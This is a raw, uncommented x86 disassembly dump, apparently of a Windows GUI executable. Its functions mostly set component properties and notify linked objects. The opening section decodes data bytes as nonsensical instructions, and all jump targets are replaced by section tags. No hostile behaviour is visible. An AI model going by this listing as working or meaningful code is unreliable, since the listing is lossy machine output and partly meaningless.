adc [ eax + 0x41 ] ch
add [ eax ] al
add [ eax ] cl
inc ecx
arpl [ esi + ebp * 2 + 0x4c ] si
imul esi [ ebx + 0x74 ] 0xb6940000
inc ebp
add [ eax ] cl
or dl [ eax + ecx * 2 + 0x69 ]
outsb
je r-xdata
inc ecx
add ah dh
stosb [ edi ]
popad
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi - 0x63ffba49 ] cl
mov bh 0x45
add [ eax + 0x50000000 ] ah
jbe r-xdata
inc ecx
add al bh
stosb [ edi ]
inc ecx
add ah cl
lahf
inc ecx
add [ esp + ebp * 4 + 0x41 ] ch
add al cl
lodsb [ esi ]
inc ecx
add [ ebp + ebp * 4 - 0x5973ffbf ] bl
inc ecx
add al bl
lodsd [ esi ]
inc ecx
add [ esi + ebp * 4 + 0x41 ] cl
add [ eax - 0x3a ] dh
inc ebp
add [ eax + ebp * 4 + 0x41 ] bh
add [ eax ] ch
fwait
inc ecx
add [ eax ] bl
test eax 0xa9580041
inc ecx
add ah al
test eax 0x9f780041
inc ecx
add [ ebx + ebp * 4 + 0x41 ] dl
add [ eax + 0x540041a1 ] al
mov [ 0xffffffffab900041 ] al
inc ecx
add [ eax - 0x47ffbe55 ] ah
mov [ 0xffffffffa30c0041 ] al
inc ecx
add [ eax + 0x500041a3 ] bh
movsd [ edi ] [ esi ]
inc ecx
add [ eax + 0x3c0041a5 ] ch
cmpsb [ esi ] [ edi ]
inc ecx
add al ah
test al 0x41
add ah bh
test al 0x41
add ah dh
stosd [ edi ]
inc ecx
add [ edx + ebp * 4 + 0x41 ] al
add [ esi + ebp * 4 ] al
inc ecx
add [ esi + ebp * 4 ] dl
inc ecx
add [ 0x6f685354 ] cl
jb r-xdata
lea eax [ eax ]
shl [ ebp + 0x45 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + esi * 4 + 0x45 ] ch
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add ah dh
mov edi 0xc0440045
inc ebp
add al ch
push ss
inc edx
add [ edi + ecx * 4 + 0x17c00041 ] ch
inc edx
outsb
je r-xdata
add al [ ecx ]
pop es
dec eax
imul ebp [ esi + 0x74 ] 0x6727453
push ebx
je r-xdata
add [ ebx - 0x46ebffbe ] bl
inc ebp
add [ eax ] dl
lds eax [ ebp ]
clc
sbb al [ edx ]
loopne r-xdata
pop [ ecx ]
rcl [ edi ] 0x42
imul ebp [ esi + 0x67 ] 0x61430701
outsb
push ebx
push 0x4207776f
outsd
outsd
insb
popad
outsb
add [ eax + edx + 0x10000040 ] dl
inc eax
add [ eax ] bl
mov bh 0x45
add [ eax ] al
add [ eax ] al
sub_45b792
out dx eax
[ ebp + eax * 8 + 0x45 ]
add [ ebp + eax * 8 + 0x540d0045 ] al
inc ebx
jne r-xdata
dec eax
xor al [ eax ]
xor al [ fs : eax ]
int3
je r-xdata
inc eax
insd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
mov eax eax
mov al 0xb7
inc ebp
add [ edi ] al
or eax 0x73754354
je r-xdata
dec [ ebx - 0x740f7426 ]
inc esi
pop esp
test eax eax
je r-xdata
add [ eax + 0x1c ] ah
inc edx
add [ esp + ebx ] dh
inc edx
add [ esp + ebx + 0x42 ] ah
add [ ebx + ebx + 0x1c180042 ] al
inc edx
add [ esp + ebx + 0x42 ] ch
add [ eax - 0x43ffba42 ] ch
mov esi 0xbed00045
inc ebp
add ah ah
mov esi 0xbef80045
inc ebp
add [ edi + edi * 4 ] cl
inc ebp
add [ eax ] ah
mov edi 0xbf340045
inc ebp
add [ eax - 0x41 ] cl
inc ebp
add [ edi + edi * 4 + 0x45 ] bl
add [ eax - 0x41 ] dh
inc ebp
add [ edi + edi * 4 + 0x45 ] dh
add [ eax - 0x41 ] bh
inc ebp
add [ edi + edi * 4 + 0x45 ] bh
add [ eax - 0x7bffba41 ] al
mov edi 0xbf880045
inc ebp
add [ edi + edi * 4 - 0x406fffbb ] cl
inc ebp
add [ edi + edi * 4 - 0x4067ffbb ] dl
inc ebp
add [ edi + edi * 4 + 0x540b0045 ] bl
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul ebp [ esi + 0x6b ] 0xb9e85653
jge sub_45b8a4
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add ah cl
sbb eax [ edx ]
enter 0x421b 0x0
add [ edx + eax * 2 ] bl
insd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
sbb [ edi - 0x4ddbffbb ] dh
inc ebp
add [ ebx ] al
add [ eax ] cl
inc ecx
arpl [ esi + ebp * 2 + 0x4c ] si
imul esi [ ebx + 0x74 ] 0xb8200000
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x180045b8 ] bl
add [ eax ] al
add [ eax - 0x1fffbe8f ] bh
xor al 0x40
add ah ch
xor al 0x40
add al dh
xor al 0x40
add ah dh
xor al 0x40
add al ch
xor al 0x40
mov edx ebx
and dl 0xfc
mov eax esi
call sub_421cbc
test bl bl
jle r-xdata
mov edx esi
call sub_45bcb8
pop esi
pop ebx
retn
mov eax esi
call sub_40364c
sub_45b8a4
push ebx
push esi
call sub_403664
mov ebx edx
mov esi eax
mov eax [ esi + 0x5c ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_421cbc
test bl bl
jle r-xdata
mov edx esi
call sub_45bcb8
pop esi
pop ebx
retn
mov eax esi
call sub_40364c
sub_45b914
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4217d0
mov edi [ esi + 0x2c ]
mov eax edi
mov edx [ r-xdata ]
call sub_40343c
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax ebx
call sub_45b9bc
sub_45b948
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax ebx
call sub_45b8d8
test eax eax
jl r-xdata
pop edi
pop esi
pop ebx
retn
mov edx [ ebx + 0x5c ]
mov edi [ edx + 0x30 ]
mov edx [ edi + 0x8 ]
test esi esi
jge r-xdata
cmp edx esi
jg r-xdata
xor esi esi
cmp eax esi
je r-xdata
mov esi edx
dec esi
mov edx edi
xchg edx eax
call sub_4188a0
mov eax [ ebx + 0x5c ]
mov eax [ eax + 0x30 ]
mov ecx ebx
mov edx esi
call sub_418a2c
sub_45b990
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x58 ]
call sub_4044b8
je r-xdata
pop esi
pop ebx
retn
lea eax [ ebx + 0x58 ]
mov edx esi
call sub_404100
mov eax [ ebx + 0x5c ]
test eax eax
je r-xdata
mov edx [ eax ]
call [ edx + 0x30 ]
sub_45b9bc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x5c ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
test esi esi
je r-xdata
mov edx ebx
call sub_45bcb8
mov edx ebx
mov eax esi
call sub_45bc98
sub_45b9e4
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x1
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_40343c
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_45b9bc
sub_45ba10
push ebx
push esi
push edi
mov ebx eax
mov edi [ ebx + 0x5c ]
test edi edi
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx ebx
call sub_470798
test al al
jne r-xdata
mov edx ebx
mov eax edi
mov si 0xfff3
call sub_4034ac
test al al
jne r-xdata
mov al 0x1
mov eax ebx
call sub_421d48
test al al
jne r-xdata
mov ecx ebx
xor edx edx
mov eax 0xb040
call sub_44c790
dec eax
je r-xdata
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_45ba68
push ebx
push esi
push edi
mov ebx eax
mov edi [ ebx + 0x5c ]
test edi edi
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx ebx
call sub_4707c0
test al al
jne r-xdata
mov edx ebx
mov eax edi
mov si 0xfff0
call sub_4034ac
test al al
jne r-xdata
mov al 0x1
mov eax ebx
call sub_421d64
test al al
jne r-xdata
mov ecx ebx
xor edx edx
mov eax 0xb03f
call sub_44c790
dec eax
je r-xdata
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_45bac0
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_421370
mov dl 0x1
mov eax [ r-xdata ]
call sub_403280
mov [ ebx + 0x30 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403280
mov esi eax
mov [ ebx + 0x34 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_45bc44
mov [ ebx + 0x58 ] 0x0
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4035fc
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403654
pop [ fs : 0x0 ]
add esp 0xc
sub_45bb2c
push ebx
push esi
push edi
call sub_403664
mov ebx edx
mov edi eax
mov eax [ edi + 0x34 ]
call sub_4032b0
jmp r-xdata
mov esi [ edi + 0x30 ]
cmp [ esi + 0x8 ] 0x0
jg r-xdata
mov eax esi
call sub_418a98
call sub_4032b0
mov eax [ edi + 0x30 ]
call sub_4032b0
mov edx ebx
and dl 0xfc
mov eax edi
call sub_4213bc
test bl bl
jle r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_40364c
sub_45bb7c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov edx eax
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + esi * 4 ]
mov edx [ eax + 0x4 ]
cmp edx [ ebp - 0x8 ]
jne r-xdata
sub_45bbc4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_418a0c
test eax eax
jl r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_403460
mov edx edi
call sub_45b948
sub_45bc10
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x38 ]
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x38 ] eax
test eax eax
je r-xdata
mov edx [ ebx + 0x34 ]
call sub_45d560
pop esi
pop ebx
retn
mov edx [ ebx + 0x34 ]
call sub_45d5a4
mov edx ebx
mov eax [ ebx + 0x38 ]
call sub_421440
sub_45bc50
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov ecx ebx
mov edx edi
mov eax esi
call sub_42168c
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp edi [ esi + 0x38 ]
jne r-xdata
mov eax edi
mov edx [ r-xdata ]
call sub_40343c
test al al
je r-xdata
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x34 ]
jmp r-xdata
mov edx edi
mov eax esi
call sub_45bcb8
sub_45bc98
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_418854
mov [ esi + 0x5c ] ebx
mov edx ebx
mov eax esi
call sub_421440
pop esi
pop ebx
retn
sub_45bcb8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_418b4c
test eax eax
jl r-xdata
pop esi
pop ebx
retn
xor eax eax
mov [ esi + 0x5c ] eax
sub_45bcd4
push ebx
push esi
push edi
mov ebx eax
cmp [ ebx + 0x42 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov edx ebx
mov eax [ ebx + 0x44 ]
call [ ebx + 0x40 ]
test [ ebx + 0x1c ] 0x10
je r-xdata
inc esi
xor edi edi
pop edi
pop esi
pop ebx
retn
mov esi [ ebx + 0x4 ]
mov eax esi
mov edx [ r-xdata ]
call sub_40343c
test al al
je r-xdata
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ eax ]
call [ edx + 0x30 ]
inc edi
dec esi
jne r-xdata
cmp [ esi + 0x250 ] 0x0
je r-xdata
mov eax [ esi + 0x250 ]
mov edx [ eax ]
call [ edx + 0xc ]
sub_45bd3c
push ebx
push esi
push edi
push ebp
push ecx
mov esi edx
mov [ esp ] eax
mov eax [ esi + 0x8 ]
call sub_466670
mov ebx eax
mov ax [ esi + 0x4 ]
mov edx ebx
call sub_45edfc
mov ebp eax
test bp bp
je r-xdata
xor eax eax
mov eax [ esp ]
mov eax [ eax + 0x30 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
cmp bp [ ebx + 0x84 ]
je r-xdata
mov eax [ esp ]
mov eax [ eax + 0x30 ]
mov eax [ eax + 0x4 ]
mov ebx [ eax + edi * 4 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_40343c
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
jmp r-xdata
cmp [ ebx + 0x90 ] 0x0
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_45c5e4
mov edx ebp
call sub_45c69c
inc eax
je r-xdata
sub_45bdc8
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0x4a ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
sub_45bde8
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0x52 ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
sub_45be08
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ ebx + 0x58 ]
cmp al [ esp ]
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ esp + 0x1 ] al
mov al [ esp ]
mov [ ebx + 0x58 ] al
cmp al 0x1
je r-xdata
mov eax [ ebx + 0x30 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
cmp [ ebx + 0x62 ] 0x0
je r-xdata
inc esi
xor ebp ebp
mov edx ebx
mov eax [ ebx + 0x64 ]
call [ ebx + 0x60 ]
test edi edi
je r-xdata
dec al
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0x44 ]
jmp r-xdata
cmp [ esp + 0x1 ] 0x2
jne r-xdata
test edi edi
je r-xdata
jmp r-xdata
inc ebp
dec esi
jne r-xdata
mov dl [ edi + 0x94 ]
mov eax edi
call sub_45c258
cmp [ esp ] 0x2
jne r-xdata
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x4 ]
mov edi [ eax + ebp * 4 ]
mov al [ esp ]
sub al 0x1
jb r-xdata
mov al [ edi + 0x6a ]
mov [ edi + 0x94 ] al
mov dl 0x1
mov eax edi
call sub_45c258
sub_45bfa0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_421c78
mov [ esi + 0x6a ] 0x1
mov [ esi + 0x80 ] 0xffffffff
mov [ esi + 0x86 ] 0x1
xor eax eax
mov [ esi + 0x90 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035fc
mov eax esi
pop esi
pop ebx
retn
call sub_403654
pop [ fs : 0x0 ]
add esp 0xc
sub_45bff4
push ebx
push esi
call sub_403664
mov ebx edx
mov esi eax
mov eax [ esi + 0x98 ]
call sub_4032b0
mov eax [ esi + 0x9c ]
call sub_4032b0
cmp [ esi + 0x90 ] 0x0
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_45b8a4
test bl bl
jle r-xdata
lea eax [ esi + 0x90 ]
call sub_40d564
pop esi
pop ebx
retn
mov eax esi
call sub_40364c
sub_45c044
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_40343c
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_419090
mov edx [ ebx + 0x64 ]
mov edi esi
mov eax edi
call sub_45c0f0
mov dl [ ebx + 0x69 ]
mov eax edi
call sub_45c150
mov dl [ ebx + 0x6a ]
mov eax edi
call sub_45c258
mov edx [ ebx + 0x74 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov edx [ ebx + 0x7c ]
mov eax edi
call sub_45c390
mov edx [ ebx + 0x80 ]
mov eax edi
call sub_45c3f0
mov dx [ ebx + 0x84 ]
mov eax edi
call sub_45c44c
mov dl [ ebx + 0x86 ]
mov eax edi
call sub_45c4b0
push [ ebx + 0x44 ]
push [ ebx + 0x40 ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x34 ]
mov eax [ ebx + 0x48 ]
mov [ edi + 0x48 ] eax
mov eax [ ebx + 0x4c ]
mov [ edi + 0x4c ] eax
mov eax [ ebx + 0x38 ]
mov [ edi + 0x38 ] eax
mov eax [ ebx + 0x3c ]
mov [ edi + 0x3c ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_45c0f0
push ebx
push esi
push edi
push ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
mov edx [ ebx + 0x64 ]
call sub_4044b8
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
lea eax [ ebx + 0x64 ]
mov edx [ esp ]
call sub_404100
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x4c ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_403460
test eax eax
je r-xdata
sub_45c150
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x68 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x68 ] 0x1
xor edx edx
push ebp
push sub_45c248
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
cmp bl [ eax + 0x69 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x68 ] 0x0
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x69 ] bl
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x6c ] 0x0
jle r-xdata
inc edi
xor esi esi
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x30 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x69 ] 0x0
je r-xdata
inc esi
dec edi
jne r-xdata
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x50 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x5c ]
call sub_45bc08
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + esi * 4 ]
mov edx [ r-xdata ]
call sub_403460
test eax eax
je r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_40343c
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x5c ]
mov edx esi
call sub_45bbf4
mov ebx eax
cmp ebx [ ebp - 0x4 ]
je r-xdata
mov eax [ ebx + 0x6c ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x6c ]
jne r-xdata
xor edx edx
mov eax ebx
call sub_45c150
sub_45c258
push ebx
push esi
push edi
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ esp ]
cmp al [ ebx + 0x6a ]
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x5c ]
test eax eax
je r-xdata
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov dl [ eax + 0x58 ]
cmp dl 0x1
jne r-xdata
mov al [ esp ]
mov [ ebx + 0x6a ] al
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
cmp dl 0x2
jne r-xdata
mov al [ esp ]
mov [ ebx + 0x6a ] al
jmp r-xdata
inc edi
dec esi
jne r-xdata
mov dl [ esp ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov [ esp ] 0x1
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_403460
test eax eax
je r-xdata
sub_45c2d0
push ebx
push esi
push edi
push ebp
mov ebp edx
mov ebx eax
mov eax ebp
mov edx [ ebx + 0x78 ]
call sub_4044b8
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
lea eax [ ebx + 0x78 ]
mov edx ebp
call sub_404100
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_4189b0
mov edx ebp
mov ecx [ eax ]
call [ ecx + 0x60 ]
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_4189b0
mov edx [ r-xdata ]
call sub_40343c
test al al
je r-xdata
sub_45c338
push ebx
push esi
push edi
push ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
cmp eax [ ebx + 0x74 ]
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ esp ]
mov [ ebx + 0x74 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x5c ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_403460
test eax eax
je r-xdata
sub_45c390
push ebx
push esi
push edi
push ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
mov edx [ ebx + 0x7c ]
call sub_4044b8
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
lea eax [ ebx + 0x7c ]
mov edx [ esp ]
call sub_404100
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_403460
test eax eax
je r-xdata
sub_45c3f0
push ebx
push esi
push edi
push ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
cmp eax [ ebx + 0x80 ]
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ esp ]
mov [ ebx + 0x80 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_403460
test eax eax
je r-xdata
sub_45c44c
push ebx
push esi
push edi
push ecx
mov [ esp ] dx
mov ebx eax
mov ax [ esp ]
cmp ax [ ebx + 0x84 ]
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov ax [ esp ]
mov [ ebx + 0x84 ] ax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov dx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x70 ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_403460
test eax eax
je r-xdata
sub_45c4b0
push ebx
push esi
push edi
push ebp
mov ebx edx
mov ebp eax
cmp bl [ ebp + 0x86 ]
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ ebp + 0x50 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov [ ebp + 0x86 ] bl
mov eax ebp
mov edx [ eax ]
call [ edx + 0x30 ]
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebp + 0x50 ]
call sub_4189b0
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x74 ]
mov eax [ ebp + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + esi * 4 ]
mov edx [ r-xdata ]
call sub_403460
test eax eax
je r-xdata
sub_45c510
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ esi + 0x8 ]
mov edx [ esi + 0x64 ]
call sub_4044b8
jne r-xdata
xor eax eax
jmp r-xdata
mov ebx [ esi + 0x4 ]
test ebx ebx
je r-xdata
mov ebx eax
mov edx edi
mov eax esi
call sub_4218c8
test bl bl
je r-xdata
mov al 0x1
test [ ebx + 0x1c ] 0x1
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ esi + 0x50 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov edx edi
mov eax esi
call sub_45c0f0
sub_45c55c
push ebx
push ecx
mov [ esp ] 0x1
cmp [ eax + 0x8a ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0x8c ]
call [ ebx + 0x88 ]
sub_45c584
push ebx
mov ebx eax
xor eax eax
mov edx [ ebx + 0x5c ]
test edx edx
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x44 ]
cmp [ ebx + 0x6a ] 0x0
je r-xdata
cmp [ edx + 0x58 ] 0x0
jne r-xdata
cmp [ ebx + 0x6a ] 0x0
je r-xdata
cmp [ ebx + 0x95 ] 0x0
je r-xdata
pop ebx
retn
xor eax eax
jmp r-xdata
mov eax ebx
call sub_45ba10
test al al
jne r-xdata
cmp [ ebx + 0x69 ] 0x0
je r-xdata
mov al 0x1
mov dl [ ebx + 0x69 ]
xor dl 0x1
mov eax ebx
call sub_45c150
cmp [ ebx + 0x69 ] 0x0
je r-xdata
cmp [ ebx + 0x6c ] 0x0
jne r-xdata
sub_45c60c
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x90 ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x90 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403280
mov [ ebx + 0x90 ] eax
sub_45c640
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x90 ]
test esi esi
je r-xdata
xor eax eax
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jg r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_45c670
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_41a870
mov edi eax
mov eax esi
call sub_45f0e8
movzx ecx ax
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x24 ]
mov eax edi
pop edi
pop esi
pop ebx
retn
sub_45c69c
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov edi eax
mov [ esp ] 0xffffffff
mov eax edi
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov [ esp ] ebx
jmp r-xdata
mov edx ebx
mov eax edi
mov ecx [ eax ]
